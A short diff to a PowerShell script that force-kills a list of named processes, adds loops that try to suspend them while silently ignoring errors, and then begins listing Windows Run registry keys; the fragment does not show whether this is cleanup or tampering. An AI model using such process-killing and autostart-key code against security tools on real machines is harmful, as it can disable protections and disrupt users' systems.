@@ -6,6 +6,24 @@ foreach ($process in $processes) {
         Stop-Process -Name $process -Force
     }
 }
+foreach ($process in $processes) {
+    $proc = Get-Process -Name $process -ErrorAction SilentlyContinue
+    if ($proc) {
+        try {
+            Suspend-NtProcess -Name $process -ErrorAction Stop
+        } catch {}
+    }
+}
+
+foreach ($process in $processes) {
+    $proc = Get-Process -Name $process -ErrorAction SilentlyContinue
+    if ($proc) {
+        try {
+            Suspend-Process -Name $process -ErrorAction Stop
+        } catch {}
+    }
+}
+
 
 $registryPaths = @(
     "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
